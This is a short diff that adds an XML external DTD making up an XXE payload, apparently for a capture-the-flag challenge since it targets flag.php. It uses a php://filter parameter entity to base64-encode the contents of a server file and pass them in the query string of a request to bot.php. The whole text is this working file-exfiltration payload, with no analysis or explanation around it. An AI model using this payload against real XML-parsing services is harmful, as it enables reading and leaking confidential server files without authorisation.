@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=http://127.0.0.1/flag.php">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://127.0.0.1/bot.php?x=%file;'>">
+%eval;
+%error;
